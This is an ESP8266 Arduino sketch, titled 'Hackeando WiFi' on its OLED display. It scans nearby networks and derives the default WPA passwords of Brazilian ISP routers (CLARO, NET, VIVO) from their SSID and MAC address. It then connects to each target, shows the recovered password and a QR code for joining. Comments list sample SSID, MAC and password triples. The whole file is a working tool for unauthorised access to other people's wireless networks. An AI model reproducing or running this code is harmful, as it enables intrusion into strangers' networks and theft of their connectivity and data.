/*  WL_NO_SHIELD        = 255,   // for compatibility with WiFi Shield library
    WL_IDLE_STATUS      = 0,
    WL_NO_SSID_AVAIL    = 1,
    WL_SCAN_COMPLETED   = 2,
    WL_CONNECTED        = 3,
    WL_CONNECT_FAILED   = 4,
    WL_CONNECTION_LOST  = 5,
    WL_DISCONNECTED     = 6
*/
#include "ESP8266WiFi.h"
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <qrcode.h>

#define OLED_RESET 0  // GPIO0

Adafruit_SSD1306 display(OLED_RESET);

#if (SSD1306_LCDHEIGHT != 64)
#error("Height incorrect, please fix Adafruit_SSD1306.h!");
#endif

QRCode qrcode;

void setup() {
  Serial.begin(115200);
  display.begin(SSD1306_SWITCHCAPVCC, 0x3c);
  display.clearDisplay();
  display.setTextSize(2); 
  display.setTextColor(WHITE);
  display.setCursor(0, 0);
  display.println("Hackeando");
  display.print("WiFi");
  display.display();      
}
 
void loop() {
  int numberOfNetworks = WiFi.scanNetworks();
  
  for(int i =0; i<numberOfNetworks; i++){
      if (WiFi.status() != WL_CONNECTED){
        display.print(".");
        display.display();  
        //delay(5000);
      } 
      Serial.print("Network name: ");
      Serial.println(WiFi.SSID(i));
      Serial.print("Signal strength: ");
      Serial.println(WiFi.RSSI(i));
      Serial.print("MAC Address: ");
      Serial.println(WiFi.BSSIDstr(i));

        // CLARO_2GA541A2
        // C8:EA:F8:A5:41:A2
        // SENHA: F8A541A2
        
        // NET_2G9ADF29
        // 10:62:D0:9A:DF:2E
        // SENHA: D09ADF29
        
        // VIVOFIBRA-786B-2G
        // 94:EA:EA:87:78:76
        // SENHA: EAEA87786B

        // Wifi CLARO
        if(WiFi.SSID(i).substring(0, 5) == "CLARO"){
          String ssid = WiFi.SSID(i);
          String password = WiFi.BSSIDstr(i).substring(6, 8) + WiFi.SSID(i).substring(8, 14);

          String WIFI = "WIFI:T:WPA;P:" + password + ";S:" + ssid + ";H:true;";

          const char* QRCODE = WIFI.c_str();

          // Display WiFi
          display.clearDisplay();
          display.setTextSize(1); 
          display.fillScreen(BLACK);
          display.setTextColor(WHITE);
          display.setCursor(0, 0);
          display.println("WiFi:");
          display.println(WiFi.SSID(i));
          display.println("");
          display.println("MAC:");
          display.println(WiFi.BSSIDstr(i));
          display.println("");
          display.println("Senha:");
          display.println(password);
          display.display();

          WiFi.begin(ssid, password);

          if (WiFi.status() != WL_CONNECTED){
            password.toLowerCase();
            WiFi.begin(ssid, password);
          }

          delay(30000);
          if (WiFi.status() == WL_CONNECTED){
              // Imprimi Serial
              Serial.print("SENHA VIVO: ");
              Serial.println(password);

              // Display WiFi
              display.clearDisplay();
              display.setTextSize(2); 
              display.fillScreen(BLACK);
              display.setTextColor(WHITE);
              display.setCursor(0, 0);
              display.println(ssid);
              display.print("Senha: ");
              display.println(password);
              display.display(); 
              
              delay(10000);

              // Display QR CODE
              display.clearDisplay();
              display.setTextColor(BLACK);
              display.fillScreen(WHITE);
              drawQrCode(QRCODE);
              display.display(); 
          } 
          delay(10000);
        }

        // Wifi NET
        if(WiFi.SSID(i).substring(0, 3) == "NET"){
          String ssid = WiFi.SSID(i);
          String password = WiFi.BSSIDstr(i).substring(6, 8) + WiFi.SSID(i).substring(6, 12);

          String WIFI = "WIFI:T:WPA;P:" + password + ";S:" + ssid + ";H:true;";

          const char* QRCODE = WIFI.c_str();

          // Display WiFi
          display.clearDisplay();
          display.setTextSize(1); 
          display.fillScreen(BLACK);
          display.setTextColor(WHITE);
          display.setCursor(0, 0);
          display.println("WiFi:");
          display.println(WiFi.SSID(i));
          display.println("");
          display.println("MAC:");
          display.println(WiFi.BSSIDstr(i));
          display.println("");
          display.println("Senha:");
          display.println(password);
          display.display();

          WiFi.begin(ssid, password);
          
          delay(10000);
          
          if (WiFi.status() != WL_CONNECTED){
            password.toLowerCase();
            WiFi.begin(ssid, password);
          }

          delay(10000);
          if (WiFi.status() == WL_CONNECTED){
              // Imprimi Serial
              Serial.print("SENHA VIVO: ");
              Serial.println(password);

              // Display WiFi
              display.clearDisplay();
              display.setTextSize(2); 
              display.fillScreen(BLACK);
              display.setTextColor(WHITE);
              display.setCursor(0, 0);
              display.println(ssid);
              display.print("Senha: ");
              display.println(password);
              display.display(); 
              
              delay(10000);

              // Display QR CODE
              display.clearDisplay();
              display.setTextColor(BLACK);
              display.fillScreen(WHITE);
              drawQrCode(QRCODE);
              display.display(); 
          } 
          delay(10000);
        }

        // Wifi VIVO
        if(WiFi.SSID(i).substring(0, 4) == "VIVO"){     
          String ssid = WiFi.SSID(i);
          String bssid = WiFi.BSSIDstr(i);
          bssid.replace(":",""); //94EAEA877876
          String bssid2 = bssid.substring(2,10);
          String password = bssid2 + WiFi.SSID(i).substring(12, 14);
          
          //password = "uVqNGPxYTx";

          String WIFI = "WIFI:T:WPA;P:" + password + ";S:" + ssid + ";H:true;";

          const char* QRCODE = WIFI.c_str();

          // Display WiFi
          display.clearDisplay();
          display.setTextSize(1); 
          display.fillScreen(BLACK);
          display.setTextColor(WHITE);
          display.setCursor(0, 0);
          display.println("WiFi:");
          display.println(WiFi.SSID(i));
          display.println("");
          display.println("MAC:");
          display.println(WiFi.BSSIDstr(i));
          display.println("");
          display.println("Senha:");
          display.println(password);
          display.display(); 

          WiFi.begin(ssid, password);

          delay(10000);

          // Transfomar password tudo em minusculo
          if (WiFi.status() != WL_CONNECTED){
            password.toLowerCase();
            WiFi.begin(ssid, password);
          }

          delay(10000);
          if (WiFi.status() == WL_CONNECTED){
              // Imprimi Serial
              Serial.print("SENHA VIVO: ");
              Serial.println(password);

              // Display WiFi
              display.clearDisplay();
              display.setTextSize(2); 
              display.fillScreen(BLACK);
              display.setTextColor(WHITE);
              display.setCursor(0, 0);
              display.println(ssid);
              display.print("Senha: ");
              display.println(password);
              display.display(); 
              
              delay(10000);

              // Display QR CODE
              display.clearDisplay();
              display.setTextColor(BLACK);
              display.fillScreen(WHITE);
              drawQrCode(QRCODE);
              display.display(); 
          } 
          delay(10000);
        }
      Serial.println("-------------------------------");
  }
}

// função que gera QR CODE
void drawQrCode(const char* qrStr) {
  uint8_t qrcodeData[qrcode_getBufferSize(3)];
  qrcode_initText(&qrcode, qrcodeData, 3, ECC_LOW, qrStr);
 
  // QR Code Starting Point
  int offset_x = 35;
  int offset_y = 2;

  for (int y = 0; y < qrcode.size; y++) {
      for (int x = 0; x < qrcode.size; x++) {
          int newX = offset_x + (x * 2);
          int newY = offset_y + (y * 2);

          if (qrcode_getModule(&qrcode, x, y)) {
              display.fillRect( newX, newY, 2, 2, 0);
          }
          else {
              display.fillRect( newX, newY, 2, 2, 1);
          }
      }
  }
  display.display();
}
